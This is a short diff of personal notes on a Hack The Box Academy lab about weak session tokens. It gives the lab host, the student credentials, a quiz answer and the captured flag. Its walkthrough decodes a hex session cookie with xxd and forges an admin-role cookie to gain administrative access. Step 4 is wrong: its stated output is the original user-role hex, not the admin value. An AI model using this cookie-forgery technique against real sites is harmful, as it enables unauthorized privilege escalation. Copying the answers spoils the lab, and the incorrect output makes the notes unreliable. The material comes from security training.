@@ -1,1 +1,18 @@
+be sure to have entropy with your session tokens lololol ive realized this the hard way irl. bascically make them as random as you can and NON GUESSABLE 
 
+CHALLENGE: Authenticate to 94.237.57.18:45466 with user "htb-stdnt" and password "AcademyStudent!"
+
+
+Question 1 - A session token can be brute-forced if it lacks sufficient what? - entropy 
+
+
+Question 2 -  Obtain administrative access on the target to obtain the flag.
+
+1) authenticated with creds above 
+2) once logged in -> right click to inspector -> storage -> grab cookie value 
+3) in terminal -> echo '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
+output: user=htb-stdnt;role=user
+4) so we wwant our role to be admin so were gonna reverse the above command to -> echo -n 'user=htb-stdnt;role=admin' | xxd -p
+output -> 757365723d6874622d7374646e743b726f6c653d75736572
+5) inside inspector -> storage -> cookies replace with value above then hit refresh on browser 
+6) HTB{d1f5d760d130f7dd11de93f0b393abda}
